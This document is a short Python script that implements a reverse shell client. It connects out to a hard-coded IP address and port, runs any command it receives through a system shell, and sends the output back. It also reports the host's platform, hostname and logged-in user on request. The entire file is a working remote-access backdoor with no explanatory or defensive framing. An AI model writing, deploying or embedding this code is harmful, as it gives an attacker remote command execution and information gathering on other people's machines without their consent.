import socket
import subprocess
import os

HOST = '192.168.15.11'
PORT = 12345

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
client_socket.connect((HOST, PORT))

while True:
    command = client_socket.recv(1024)
    split_command = command.split()

    if command == 'quit' or command == 'exit' or command == 'q':
        break

    if split_command[0] == 'cd':
        try:
            os.chdir(split_command[1])
            client_socket.sendall(('Changed directory to ' + os.getcwd()))
        except OSError:
            client_socket.sendall(('No such directory: ' + split_command[1]))
    elif split_command[0] == 'info':
            text = '''
Platform: {platform}
Architeture: {architeture}
OS: {os}
PID: {pid}
Hostname: {hostname}
User: {user}'''.format(platform=os.uname()[0],
                       architeture=os.uname()[4],
                       os=os.uname()[3],
                       pid=os.getpid(),
                       hostname=os.uname()[1],
                       user=os.getlogin())
            client_socket.sendall((text.strip()))
    elif split_command[0] == 'help':
        client_socket.sendall(('''
- info: Show infos about system
- ls: List files
- cd: Access directories
- exit: End session
        '''))
    else:
        shell = subprocess.Popen(command,
                                 shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
        stdout_value = shell.stdout.read() + shell.stderr.read()

        client_socket.send(stdout_value.strip())

client_socket.close()
